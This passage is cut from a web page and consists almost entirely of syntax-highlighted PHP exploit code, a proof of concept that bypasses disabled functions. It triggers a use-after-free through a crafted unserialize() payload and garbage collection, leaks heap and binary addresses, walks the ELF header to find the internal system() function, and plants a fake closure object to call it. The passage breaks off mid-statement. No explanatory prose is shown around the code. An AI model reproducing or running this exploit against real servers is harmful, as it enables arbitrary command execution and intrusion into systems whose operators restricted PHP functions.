function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_Write</span>                <span class="token shell-comment comment"># handle pie</span>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_exec</span>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># 'constant' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># 'bin2hex' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># ELF header</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># system</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">ryat</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$ryat</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$chtg</span><span class="token punctuation">;</span>                <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">chtg</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ryat</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ryat</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">Helper</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># increase this value if you get segfaults</span>    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gc_collect_cycles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$out</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token shell-comment comment"># leaks</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># fake value</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># fake reference</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token shell-comment comment"># fake closure object</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token shell-comment comment"># pwn</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func type</span>    <span class="token function">write</span><span class="token 